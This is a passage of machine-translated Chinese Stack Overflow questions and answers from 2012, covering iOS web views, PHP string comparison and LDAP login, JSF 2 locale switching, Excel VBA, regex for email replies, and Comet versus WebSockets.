  b.increment!(:total_items)
end 
```

避免加载和保存以增加值。您最终可能会遇到一个丑陋的比赛条件，您会失去计数。

请注意，您的模型被称为非常不规则`Tags`。应该叫它`Tag`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:39:37.340

Post对象没有外键tag_id，改成

```
 b = self.tags.find(:post_id => self.id) 
```

这是假设 Post has_many :tags 和 Tag belongs_to :post

我同意@tadman 你应该使用增量方法，increment(attribute, by = 1)

# ios - 从 UIWebView 委托呈现 ViewController

> ID：12078506
> 
> 赞同：1
> 
> 时间：2012-08-22T17:37:26.117
> 
> 标签：ios, cocoa, uiviewcontroller, uiwebview, uiwebviewdelegate

我有`UIWebView`一个代表`id<UIWebViewDelegate>`。当我单击 UIWebView 中的链接时，我会`NSURLRequest`在回调中获得对象：

```
 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType { 
```

我想做的是：

```
- (void)presentWebViewControllerWithUrl:(NSURL*)URL{
      SVModalWebViewController *webViewController = [[SVModalWebViewController alloc] initWithURL:URL];
      webViewController.modalPresentationStyle = UIModalPresentationPageSheet;
      webViewController.availableActions = SVWebViewControllerAvailableActionsOpenInSafari | SVWebViewControllerAvailableActionsCopyLink | SVWebViewControllerAvailableActionsMailLink;
      [self presentModalViewController:webViewController animated:YES];
} 
```

当我将此代码放在我的主视图控制器中时，会出现模式 Web 视图，但如果我将它放在我的委托中，它不会出现。我如何让它出现？

* * *

### 更新：

`NO`从简单的返回`shouldStartLoadWithRequest`使我的 UIWebViews 变成白色，没有内容。似乎在 webviews 加载时正在调用回调。我正在加载本地存储`HTML`到它们中`[web loadHTMLString:@"..." baseUrl: nil]` 的模式永远不会出现。

我的视图层次结构如下：

1.  主视图
    *   界面视图
        *   UIScrollView
            *   UIWebView
            *   UIWebView
            *   ...

有没有办法“冒泡”回调，以便我可以在主视图控制器中看到事件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:48:58.497

确保在覆盖您的 shouldStartLoadWithRequest 委托方法时返回 (NO)。

另外，我在您的代码中看不到 [viewController presentModalViewController:webViewController animated:YES]，如下所示：

```
 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType 
    {
     if (navigationType != UIWebViewNavigationTypeLinkClicked)
      return (YES);

     SVModalWebViewController *webViewController = [[SVModalWebViewController alloc] initWithURL:[request URL]]; 
     webViewController.modalPresentationStyle = UIModalPresentationPageSheet;  
     webViewController.availableActions = SVWebViewControllerAvailableActionsOpenInSafari | SVWebViewControllerAvailableActionsCopyLink | SVWebViewControllerAvailableActionsMailLink; 
     [myViewController presentModalViewController:webViewController animated:YES];
     return(NO);
    } 
```

# php - 在 PHP 中将字符串与 file_get_contents 进行比较

> ID：12078509
> 
> 赞同：1
> 
> 时间：2012-08-22T17:37:29.660
> 
> 标签：php, string, compare

我正在尝试使用以下命令比较从网站读取的仅包含两个字符（如 US、FR、DE 等）的字符串：

```
$country = "http://ws.geonames.org/countryCode?;"
$country_content = file_get_contents($country);
$vartest = 'US'; 
```

然后尝试将作为字符串的 $country_content 与我的输入进行比较，如下所示：

```
if (strcmp($vartest,$country_conent))
    {
    echo 'some text';
    } 
```

或者

```
if ($country_content == $vartest))
    {
    echo 'some text';
    } 
```

和（对于任何空白）

```
if(trim($country_content[0]) == trim($vartest)){
} 
```

但我总是得到 if 语句的“错误”答案，我不知道为什么它这么复杂。我花了这么多时间，现在我认为这是 PHP 中的一个错误。你能解释一下吗？

# rotation - 使用 Raphaël 多次旋转文本元素

> ID：12078510
> 
> 赞同：0
> 
> 时间：2012-08-22T17:37:32.560
> 
> 标签：rotation, raphael

我画了一个圆圈，并用 Raphael 将一些文本元素排列在这个圆圈之外。它们中的每一个都旋转到圆的中心点。到目前为止，一切都很好。

但现在我想再次旋转它们，例如 30 度。但如果我这样做，那么所有元素都会旋转到 30 度。

一个解决方案可能是，我循环遍历每个文本元素，计算“当前度数 + 30度”并开始动画......</p>

但如果我能在一组元素中做到这一点会更好。不幸的是，我会遇到每个文本元素都旋转到 30 度的问题……</p>

有没有人建议我如何才能最好地完成这项工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:45:29.140

确实有一种简单的方法可以通过一组来完成此操作。您可以将增量旋转附加到变换中，而不是设置旋转值，如下所示：

```
//  assumes you have a variable named 'mySet'

mySet.animate( { transform: '...r30' }, 500, '<>' ); 
```

我相信这应该完全符合您的意图。如果没有，请随意向我扔蔬菜。

# netty - RXTX 的 ETA 回到 Netty 4

> ID：12078511
> 
> 赞同：0
> 
> 时间：2012-08-22T17:37:36.517
> 
> 标签：netty, rxtx

在旧的 Netty 4 分支中曾经有 RXTX 支持。

是否有任何 ETA 可以让 RXTX 回到 Netty 4 中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T05:28:21.950

简短的回答是“不”......只要有人找到时间，“长”。完成后随时将其移植回来并打开拉取请求；）

# jsf - 如何在 JSF 2.0 中更改语言环境？

> ID：12078520
> 
> 赞同：9
> 
> 时间：2012-08-22T17:38:05.873
> 
> 标签：jsf, jsf-2

在我的应用程序中，用户应该能够切换区域设置（用于在页面上呈现文本的语言）。大量教程使用 FacesContext.getCurrentInstance().getViewRoot().setLocale()。例如：[http](http://www.mkyong.com/jsf2/jsf-2-internationalization-example/) ://www.mkyong.com/jsf2/jsf-2-internationalization-example/ 。但是，这在 JSF 2.0 中根本不起作用（它在 1.2 中确实起作用）。语言从不切换。没有错误或任何东西。相同的代码在 JSF 1.2 中运行良好。

什么是正确和确定的方法？我拼凑了一个解决方案，但不确定这是否正确。这工作正常。用户点击英语或法语后，语言切换。这是给你一些想法的代码片段。

```
@ManagedBean(name = "switcher")
@SessionScoped
public class LanguageSwitcher {
    Locale locale = FacesContext.getCurrentInstance().getViewRoot().getLocale();
    public String switchLocale(String lang) {
        locale = new Locale(lang);

        return FacesContext.getCurrentInstance().getViewRoot().getViewId() +
            "?faces-redirect=true";
    }
    //getLocale() etc. omitted for brevity
} 
```

XHTML：

```
<f:view locale="#{switcher.locale}">
    <h:outputText value="#{msg.greeting}" />
    <h:commandLink value="English" action="#{switcher.switchLocale('en')}" />
    <h:commandLink value="French" action="#{switcher.switchLocale('fr')}" />
</f:view> 
```

只是为了给你更多信息，这里是配置文件。

```
<application>
    <locale-config>
        <supported-locale>en</supported-locale>
        <supported-locale>fr</supported-locale>
    </locale-config>
    <resource-bundle>
        <base-name>com.resources.Messages</base-name>
        <var>msg</var>
    </resource-bundle>
</application> 
```

再一次，这行得通。但是，我没有通过以任何方式调用任何 API 来更改 JSF 本身的语言环境。这让我有些毛骨悚然的感觉。这是更改用户语言环境的正确方法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-23T14:58:45.650

好的，冒着回答我自己问题的风险，我想总结一下我发现的所有不同方法。

基本方法是我已经在做的。也就是说，在会话范围内有一个托管 bean，它返回用户的 Locale。这个语言环境需要在每个使用`<f:view locale="...">`. 我从 BalusC 的一篇文章中学到了这项技术，所以在这里感谢。

现在，需要关注的是 f:view 元素的使用。这需要在每一页中重复，如果被错误地省略，这可能是缺陷的来源。我找到了解决这个问题的几种方法。

方法 #1：创建一个 Facelet 模板并在其中添加 f:view 元素。单个模板用户页面不必担心添加此元素。

方法#2 使用相位监听器。@meriton 已在此处发布解决方案。谢谢你。

方法 #3 使用自定义视图处理程序，它扩展 MultiViewHandler 并从 calculateLocale() 方法返回用户的区域设置。这在《Beginning JSF 2 APIs and JBoss Seam》一书中有所描述，作者：Kent Ka Iok Tong。这是本书中稍作改动的示例：

```
public class MyViewHandler extends MultiViewHandler {
    public Locale calculateLocale(FacesContext context) {
        HttpSession session = (HttpSession) context.getExternalContext()
            .getSession(false);
        if (session != null) {
            //Return the locale saved by the managed bean earlier
            Locale locale = (Locale) session.getAttribute("locale");
            if (locale != null) {
                return locale;
            }
        }
       return super.calculateLocale(context);
    }
} 
```

然后在faces config中注册它。

```
<application>
    <view-handler>com.package.MyViewHandler</view-handler>
<!-- Other stuff ... -->
</application> 
```

这比相位监听器要优雅一些。不幸的是，MultiViewHandler 是 com.sun.faces.application.view 包中的一个内部非 API 类。这会带来一些未来的风险。

无论是方法#2 还是#3，页面中都不需要 f:view 元素。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-09-19T10:38:10.907

可以使用自定义视图处理程序，该处理程序`javax.faces.application.ViewHandlerWrapper`从 calculateLocale() 方法扩展和返回用户的语言环境。

这绝对比`MultiViewHandler`从专有的 SUN 包扩展更好`com.sun.faces.application.view`，无论您的建议中提到的“*开始 JSF 2 API ”一书中描述了什么。*除此之外，您的原始方法绝对可以：

```
public class MyViewHandler extends ViewHandlerWrapper {

  public Locale calculateLocale(FacesContext context) {
    HttpSession session = (HttpSession) context.getExternalContext()
        .getSession(false);
    if (session != null) {
      //Return the locale saved by the managed bean earlier
      Locale locale = (Locale) session.getAttribute("locale");
      if (locale != null) {
        return locale;
      }
    }
    return super.calculateLocale(context);
  }
} 
```

然后在faces config中注册它。

```
 <application>
      <view-handler>com.package.MyViewHandler</view-handler>
      <!-- Other stuff ... -->
    </application> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T18:47:51.813

我最近遇到了一个相关的问题。在我的例子中，JSF 实现`UIViewRoot.setLocale()`在导航到另一个视图后忘记了视图区域设置。我宁愿认为这是 JSF impl 中的一个错误，但我没有时间确定。

我并不特别喜欢这种`<f:view>`方法，因为该标签已被 facelets 淘汰——似乎除了保留语言环境。这让我很想将它包含在 Facelets 模板中。因此，我编写了以下 PhaseListener：

```
/**
 * PhaseListener that keeps the current view locale in the session while no request is being processed, to work around
 * bugs where JSF forgets the changed locale.
 */
public class SaveViewLocaleToSessionPhaseListener implements PhaseListener {

    private static final String key = "locale";

    @Override
    public PhaseId getPhaseId() {
        return PhaseId.ANY_PHASE;
    }

    @Override
    public void beforePhase(PhaseEvent event) {
        // do nothing
    }

    @Override
    public void afterPhase(PhaseEvent event) {
        PhaseId currentPhase = event.getPhaseId();
        if (currentPhase == PhaseId.RESTORE_VIEW) {
            viewRoot().setLocale((Locale) sessionMap().get(key));
        } else if (currentPhase == PhaseId.RENDER_RESPONSE) {
            sessionMap().put(key, viewRoot().getLocale());
        }
    }

    private  Map<String, Object> sessionMap() {
        return FacesContext.getCurrentInstance().getExternalContext().getSessionMap();
    }

    private UIViewRoot viewRoot() {
        return FacesContext.getCurrentInstance().getViewRoot();
    }
} 
```

但是，我无法提供任何确凿的证据证明这确实比简单地使用`<f:view>`.

> 但是，我没有以任何方式更改 JSF 本身的语言环境。

当然你做到了：`<f:view>`标签从值表达式中读取语言环境，并将其传递给`UIViewRoot.setLocale()`.

# vb.net - vb.net Aspose.OCR - 从图像中提取文本

> ID：12078524
> 
> 赞同：0
> 
> 时间：2012-08-22T17:38:16.227
> 
> 标签：vb.net, winforms, bitmap, aspose

我试图通过 我的代码 从图像`Aspose.OCR`中 提取文本：

```
Const resourceFileName As String = "c:\2011.08.05 v1.1 Aspose.OCR.Resouces.zip"
        Dim uploadedImage As String = "c:\ConvertMeToText.bmp"
        Try
            'Create OcrEngine instance and assign 
            'image, language and image configuration
            Dim ocr As New OcrEngine()
            ocr.Image = ImageStream.FromFile(uploadedImage)

            ocr.Languages.AddLanguage(Language.Load("english"))
            ocr.Config.NeedRotationCorrection = True
            ocr.Config.UseDefaultDictionaries = True
            Dim fileStream As New FileStream(resourceFileName, FileMode.Open)
            ocr.Resource = fileStream
            Try
                If ocr.Process() Then
                    TextBox1.Text = ocr.Text.ToString()
                End If
            Catch ex As Exception
                MsgBox("Exception: " & ex.Message)
            End Try
            fileStream.Close()
            ocr = Nothing
        Catch ex As Exception
           MsgBox("Exception: " & ex.Message)
        End Try 
```

例外：ZipEntry::ReadHeader(): 位置 0x00000000 处的错误签名 (0x00000100)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-09T13:31:41.783

我的名字是 Nayyer，我在 Aspose 担任支持开发人员/技术传播者。

从异常来看，Aspose.OCR 版本和资源文件版本似乎存在一些差异。每个 Aspose.OCR 版本都使用单独的 resources.zip 文件，如果您尝试将 Aspose.OCR v1.0.0 与 2011.08.05 v1.1 Aspose.OCR.Resouces.zip 一起使用，那么您可能会遇到类似的异常。或许您可以尝试最新版本的[Aspose.OCR v.1.1.0](http://www.aspose.com/community/files/51/.net-components/aspose.ocr_for_.net/entry324278.aspx)，它的兼容资源文件可通过[此链接](http://www.aspose.com/community/files/51/.net-components/aspose.ocr_for_.net/entry323723.aspx)获得。

# javascript - iOS - 从 JavaScript 和 FMDB 访问单个 sqlite 数据库

> ID：12078526
> 
> 赞同：6
> 
> 时间：2012-08-22T17:38:23.293
> 
> 标签：javascript, ios, sqlite, cordova-2.0.0

我们遇到的问题似乎只出现在 iOS 设备上，但在模拟器上似乎运行良好。这就是问题所在...

*   我们的 iOS 应用程序是 Hybrid (Cordova)，其中一些视图完全是原生的，而另一些则完全是 Web 的。
*   我们想在两个代码库中使用相同的 sqlite db。
*   在 Web 中，我们使用 WebSQL api（不是 Cordova 插件），在本机 iOS 端，我们使用 FMDB。
*   该数据库最初是从 javascript 创建的，并放置在 App 的 Library Directory 中
    *   **4.x 目录** `<AppDir>/Library/WebKit/Databases/file__0/0000000000000001.db`
    *   **5.x 目录** `<AppDir>/Library/Caches/file__0/0000000000000001.db`
*   每当 FMDB 访问 sqlite 数据库时，JS 代码就不能再针对它创建的数据库运行事务。

虽然还有其他类似的 SO 问题，但**我还没有看到 Web 和本地都可以访问数据库的问题。**根据我到目前为止所做的研究，这似乎是一个仅出现在设备上的沙盒问题。这是我们用来打开数据库的代码。

```
NSArray  *libraryPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory,
                                                             NSUserDomainMask,
                                                             YES);
NSString *libraryDir   = [libraryPaths objectAtIndex:0];
NSString *databasePath = [libraryDir
                          stringByAppendingPathComponent:@"WebKit/Databases/file__0/"];

NSFileManager *fileManager = [NSFileManager defaultManager];

if (![fileManager fileExistsAtPath:databasePath]) {
    databasePath = [libraryDir
                    stringByAppendingPathComponent:@"Caches/file__0/"];
}

NSString *databaseFile = [databasePath
                          stringByAppendingPathComponent:@"0000000000000001.db"];

if (!static_fmdb) {
    static_fmdb = [FMDatabase databaseWithPath:databaseFile];
    NSAssert(static_fmdb, @"Unable to open create FMDatabase");
}
if (![static_fmdb open]) {
    NSLog(@"Error in %@: Failed to connect to database!\n",
          NSStringFromSelector(_cmd));
} 
```

注意这段代码运行后，后续JS端调用数据库会报如下错误：“unable to open a transaction to the database”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T20:47:46.553

通过将我们的 sqlite 数据库上的迁移一直回滚到第一次迁移之前，我们能够在这里达到预期的结果，从而有效地为我们提供了一个干净的数据库。我们也没有删除 Web 视图创建的任何缓存文件。它不是世界上最好的解决方案，但它似乎适用于我们的用例。如果还有其他答案，我很想听到更多关于它们的信息。

# excel - VBA Excel：如何删除 2 列中的重复项

> ID：12078529
> 
> 赞同：4
> 
> 时间：2012-08-22T17:38:31.203
> 
> 标签：excel, vba, duplicates, range

我有以下内容，但我遇到了语法问题。我想将当前选择设置为一个范围，并且我想从该选择中删除重复项。我怎样才能做到这一点？

```
'remove duplicates
Columns("B:C").Select
Dim duplicates As Range
Set duplicates = Selection
ActiveSheet.duplicates.RemoveDuplicates(Columns:=Array(1, 2), Header:=xlYes) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-22T17:56:03.887

如果函数没有返回任何值，则在调用 RemoveDuplicates 时删除括号，如下所示：

```
selection.RemoveDuplicates Columns:=Array(1, 2), Header:=xlYes 
```

# visual-studio-2010 - Visual Studio 2010 中的工具提示

> ID：12078530
> 
> 赞同：2
> 
> 时间：2012-08-22T17:38:36.257
> 
> 标签：visual-studio-2010, visual-studio, comments, tooltip, visual-assist

有时我更喜欢在声明变量后添加注释。例如：

```
bool isOverhwndChild1; // This is just an example to make my question clear and you can understand.
bool isOverhwndChild2; // This is just an example to make my question clear and you can understand.
bool isOverhwndChild3; // This is just an example to make my question clear and you can understand.
bool isOverhwndChild4; // This is just an example to make my question clear and you can understand. 
```

我安装了`Visual Assist X`.

如果我将鼠标移到这些变量上，则会出现一个工具提示并显示注释。但是如果注释很长，工具提示的宽度就会很大。

我不想这样写，因为它分散了我对变量声明的注意力：

```
// This is just an example
// to make my question clear
// and you can understand.
bool isOverhwndChild1;

// This is just an example
// to make my question clear
// and you can understand.
bool isOverhwndChild2;

// This is just an example
// to make my question clear
// and you can understand.
bool isOverhwndChild3;

// This is just an example
// to make my question clear
// and you can understand.
bool isOverhwndChild4; 
```

有没有办法在 VS2010 的注释中添加换行符，以便工具提示显示多行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-01T10:21:59.600

目前，评论和工具提示都很长，或者都是多行的。如果有一些标记（\n、< br /> 或类似的东西）在这里有更好的控制，那就太好了。或者您可以指定此类工具提示的最大宽度的选项也可以解决您的问题。

作为一种“解决方法”，我建议即使变量名变长，也要尽量缩短注释。如果变量是不言自明的，这甚至支持代码的可读性

# php - PHP脚本检查用户是否在数据库中然后对LDAP进行身份验证

> ID：12078531
> 
> 赞同：0
> 
> 时间：2012-08-22T17:38:39.697
> 
> 标签：php, active-directory, ldap, mysqli, prepared-statement

我正在尝试检查用户名是否在我的一个数据库中。

```
$mysqli->prepare("SELECT username FROM table WHERE username = ?") ... 
```

如果用户名在我的数据库中，我想拥有它们，然后尝试对我的 LDAP 服务器进行身份验证。

```
if($stmt->num_rows === 0){ ... 
```

下面的代码可以在没有所有 mysqli 的情况下工作，以测试用户名是否在数据库中。现在，如果我尝试登录，我会遇到：

> 致命错误：在第 22 行调用 C:\xampp\htdocs\webapp\login.php 中未定义的方法 mysqli_stmt::get_result()

```
<?php
    require_once('config.php'); //db connection

    //error_reporting(0); 
    if (isset($_POST['submitted'])) { 

        $username =$_POST['username'];
        $password=$_POST['password'];

        $ldap = ldap_connect("localserv1.local.com", 389) or exit ("Error connecting to LDAP server.");

        //Settings for AD
        ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
        ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);

            //Prep statment to check if user is in tblAdmins
            if ($stmt = $mysqli->prepare("SELECT username FROM table WHERE username = ?"))
            {
                  $stmt->bind_param('s', $username);
                  $stmt->execute();
                  $stmt->store_result();
                  $result = $stmt->get_result();

                  // Check if the username is in the db
                  if($stmt->num_rows === 0){
                    //The user is not in the DB
                    echo('<p class="error">You are not authorized to view this application.</p><div class="clear"></div>');
                  }elseif ($bind = ldap_bind($ldap, 'local\\'.$username, $password)) {          
                    //Log them in!
                    session_register("username");
                    session_register("password");
                    header("Location: https://" . $_SERVER['HTTP_HOST'] . substr($_SERVER['REQUEST_URI'], 0, -9) . "index.php" );
                    exit;       
                   }else {
                        // Invalid LDAP user/pass
                        echo('<p class="error">Invalid username or password.</p><div class="clear"></div>');        
                    }
            }else {
                //Error
                printf("Prep statment failed: %s\n", $mysqli->error);
            }
    }
    ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T03:21:53.953

PHP 手册页上的评论[建议](http://www.php.net/manual/en/mysqli-stmt.get-result.php#105802)`get_result`可能需要“mysqlnd 驱动程序”才能使该功能正常工作。

由于您实际上并未使用该`$result`变量，因此您可以完全删除该行以更轻松地解决问题。

# objective-c - Xcode - 让单元格在触摸事件后显示新文本，使其扩展

> ID：12078539
> 
> 赞同：1
> 
> 时间：2012-08-22T17:39:42.817
> 
> 标签：objective-c, ios, xcode, cocoa-touch

我正在尝试创建一个动态表格，该表格在点击时展开以显示其他内容。我已经到了用来自 NSMutableArray 的信息填充表的地步。我也可以按每个单元格，它会扩大到两倍大小。现在，被证明有点麻烦的下一步是让它在单击单元格时显示新的/替代文本。首先，这是我的设置方法：

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

        if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];

        NSString *cellValue = [cellContent objectAtIndex:indexPath.row];
        cell.textLabel.text = cellValue;
        cell.accessoryType = UITableViewCellAccessoryDetailDisclosureButton;

    }

    return cell;
} 
```

在此之后，我有单元格在按下时扩展的方法：

```
 - (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {
    // If our cell is selected, return double height
    if([self cellIsSelected:indexPath]) {
        return kCellHeight * 2.0;
        [cellContent replaceObjectAtIndex:[self cellIsSelected:indexPath] withObject:@"NEW STUFF HERE"];
} 
```

我必须以错误的方式解决这个问题，因为当我触摸单元格时没有任何变化。如何让它在触摸时显示新的/替代文本？任何帮助都会非常棒，我认为这可能很容易，但我目前看不到。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:07:18.793

您的第二种方法仅在构建或重建单元时触发。您需要通过以下方法明确要求它刷新自身：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath; 
```

然后在该方法中，您可以调用

```
[self.tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationNone]; 
```

现在你的重绘方法将被触发，所以你可以在那里处理你想要的任何东西。

# asp.net-mvc - 带有 Dotnetopenauth 的自定义配置文件提供程序新的 MVC 4 模板

> ID：12078543
> 
> 赞同：4
> 
> 时间：2012-08-22T17:40:00.133
> 
> 标签：asp.net-mvc, asp.net-mvc-4, dotnetopenauth, webmatrix-2

您现在如何使用启用了 DotNetOpenAuth 的新 MVC 模板配置成员资格、配置文件和角色管理器？我在 web.config 中看不到配置，那么您现在如何实现自定义配置文件提供程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-23T20:15:03.513

使用新的 MVC4 模板，非常相关。所有身份验证都由 OAuth 和 Webmatrix.Security 处理，而不是使用指定的 ProfileProvider:Profilebase。开箱即用，看起来不支持扩展 Profilebase。相反，您似乎必须创建自己的表来保存任何自定义配置文件属性。看看这个：[http](http://www.asp.net/web-pages/tutorials/security/16-adding-security-and-membership) ://www.asp.net/web-pages/tutorials/security/16-adding-security-and-membership 。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T16:17:40.013

请参阅[MVC 4](http://blogs.msdn.com/b/webdev/archive/2012/08/21/10339969.aspx)的解决方案和内置的 oauth 支持/讨论：

有关[插入](http://blogs.msdn.com/b/webdev/archive/2012/08/23/plugging-custom-oauth-openid-providers.aspx)自定义 OAuth/OpenID 提供程序的信息，请参阅。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:43:24.717

MSDN 有一篇详细的文章解释了如何[实现配置文件提供程序](http://msdn.microsoft.com/en-us/library/0580x1f5.aspx)。您需要做的只是插入 DotNetOpenAuth。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-23T13:47:33.663

配置文件和角色管理器独立于用于验证用户的机制，因此与 DotNetOpenAuth 无关。只有会员资格提供者会受到您对 DotNetOpenAuth 的使用的影响，并且[这个问题已经被询问和回答](https://stackoverflow.com/questions/918156/implementing-openid-in-asp-net-properly-membership-or-authentication-provide)。

# php - preg_split 在项目之前的行

> ID：12078545
> 
> 赞同：0
> 
> 时间：2012-08-22T17:40:09.750
> 
> 标签：php, regex, email, preg-split, regex-lookarounds

我正在创建自动电子邮件回复，但我不想在回复中显示原始电子邮件。电子邮件中有一行必须在上面回复。但是电子邮件程序会在此行之前添加一行，例如“2012 年 8 月 21 日，晚上 11:30，大卫写道：”。

我正在使用此代码将响应分成两部分。它只是无法正常工作。

```
$parts = preg_split('/([\r|\n].+[\r|\n]>[\r|\n])?(> )?--- ABOVE THIS LINE ---/',$in->body); 
```

它正在拆分的电子邮件正文是

```
test from user back again

On Wed, Aug 22, 2012 at 9:55 AM, Support <support@example.com> wrote:

> --- ABOVE THIS LINE ---
>
>   Support Ticket 
```

我想要做的是在 --- ABOVE THIS LINE --- 位上方的内容处拆分。换句话说，我想删除“On Wed, Aug 22...”这一行。我认为并非所有的电子邮件程序都设置了这条线，如果它们这样做了，它们的做法会有所不同。在此示例中，电子邮件程序实际上也添加了一个空行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T11:22:40.320

干得好！

```
/^.*wrote:(?s).* --- ABOVE THIS LINE ---/im 
```

和解释：

```
# ^.*wrote:(?s).* --- ABOVE THIS LINE ---
# 
# Options: case insensitive; ^ and $ match at line breaks
# 
# Assert position at the beginning of a line (at beginning of the string or after a line break character) «^»
# Match any single character that is not a line break character «.*»
#    Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»
# Match the characters “wrote:” literally «wrote:»
# Match the remainder of the regex with the options: dot matches newline (s) «(?s)»
# Match any single character «.*»
#    Between zero and unlimited times, as many times as possible, giving back as needed (greedy) «*»
# Match the characters “ --- ABOVE THIS LINE ---” literally « --- ABOVE THIS LINE ---» 
```

# websocket - Comet 现在是否已经过时了 Server-Sent Events 和 WebSocket？

> ID：12078550
> 
> 赞同：19
> 
> 时间：2012-08-22T17:40:25.047
> 
> 标签：websocket, comet, server-sent-events

还是服务器发送事件和 WebSocket 取代 Comet 技术？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-22T22:11:17.260

我将从术语和历史的角度来处理这个答案。

正如我在[另一个答案](https://stackoverflow.com/questions/10782058/periodic-pull-comet-long-polling-websockets/10785129#10785129)中所写的那样，我们可以使用几个总括术语之一来指代可用于将事件从 Web 服务器异步发送到 Web 客户端（反之亦然）的一组技术。“**推送技术**”这个词已经使用了十五年（关于推送技术的简短历史，您可以查看我多年前写的这份[旧白皮书——全面披露：我是 Lightstreamer 的创建者）。](http://www.lightstreamer.com/docs/Lightstreamer_WhitePaper.pdf)现在，“ **Web 流**”一词正在 IT 分析师中获得共识（参见 Gartner，“Cool Vendors in Application and Integration Platforms，2012”，作者 Massimo Pezzini 和 Jess Thompson，2012 年 4 月 11 日）。

重要的方面是我们正在谈论基于 Web 的通信，即利用 Web 协议。有大量不基于 Web 的消息传递协议和技术（例如大多数 MOM），我们不将它们视为推送技术（或 Web 流）的一部分。

话虽如此，您可以区分推送技术（或 Web 流）的两个子类别：

*   **基于**HTTP****
***   **基于**WebSockets******

 ****HTTP 和 WebSocket 都是 Web 协议。

如果您分解基于 HTTP 的推送机制，您可以识别：

*   **HTTP 流式传输**
*   **HTTP 长轮询**
*   **HTTP 轮询**

传统上，“**彗星**”一词（由 Alex Russell 于**2006 年**创造）一直指 HTTP 流和 HTTP 轮询。但是考虑一下 HTTP 流的第一个实现可以追溯到**2000 年**，远在 Comet 术语被创造之前（例如 Pushlets 和 Lightstreamer）。

现在，WebSockets 使实现 Web 流式传输变得更加简单，特别是对于“反向”通道（从浏览器发送到服务器的消息）。有关 HTTP 反向通道特性的更详细说明，请参阅我为 CometDaily 撰写的这篇文章的最后部分：http: [//cometdaily.com/2011/07/06/push-technology-comet-and-websockets -10 年的历史 - 从 lightstreamers 的角度来看/](http://cometdaily.com/2011/07/06/push-technology-comet-and-websockets-10-years-of-history-from-lightstreamers-perspective/)

正如 Phil 所指出的，Comet 仍然是必要的，而且可能还会持续几年，因为周围不仅有旧的浏览器（包括不支持 WebSockets 的 IE9……），而且还有无数不讲 WS 的网络中介. 例如，我们已经看到一些国家的一些移动运营商（例如意大利沃达丰）支持 WSS 但屏蔽了 WS。所以一个没有彗星“黑客”的世界还很遥远……让我补充一点，就个人而言，我从来不喜欢应用于彗星的“黑客”一词（或者，从更正确的历史观点来看，适用于 HTTP 流和 HTTP 长轮询）。在这些技术上工作了 12 年，我可以说我们已经能够对它们进行如此多的改进，以至于它们本身已经成为一项成熟的技术，

现在，让我们想象一个普遍支持 WebSocket 并且不再需要 Comet 的世界。你到底得到了什么？好吧，只是一个双向传输，仅此而已……在它之上，您需要构建所有内容：消息传递协议（可能基于 pub/sub），与服务器代码对话的服务器端接口，以及一套很好的优化技术和算法来管理数据流，包括带宽管理、数据合并、自动节流、增量交付等。好消息是消息传递协议和优化机制都已经被好的 Comet 解决方案实现了. 因此，扩展以前的 Comet 服务器以支持 WebSocket 是我们所有供应商都实施的自然演变。

因此，简而言之，在不远的将来，WebSockets 可能会使 Comet 传输过时，但需要吸收所有已经在传统 Comet 服务器上实现并经过良好测试的更高层。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-22T18:58:12.763

**Comet**是一组技术原理/通信模式，通常使用 HTTP 长轮询来实现。它使服务器能够按需向浏览器发送数据（即服务器推送）。当前的 Comet 实现需要在客户端使用一些复杂的 Javascript，并在服务器端提供支持（对于长期持有的请求）。

**Server-Sent Events**是一个标准 (HTML5) 浏览器 API，用于启用这种随需应变的服务器推送。您可以将服务器发送事件视为使用复杂的 Javascript 完成的操作并将其推送到浏览器本身。

**WebSockets**允许浏览器与支持 WebSocket 的服务器建立持久的全双工/双向连接。它不需要客户端定期向服务器发出 HTTP 请求以维持连接，就像使用 AJAX/long-poll 一样。建立连接后，与普通 HTTP/HTTP 长轮询的开销相比，每条消息的开销非常低（几个字节）。您可以使用 WebSockets 进行高效的服务器推送，但这只是一个应用程序。

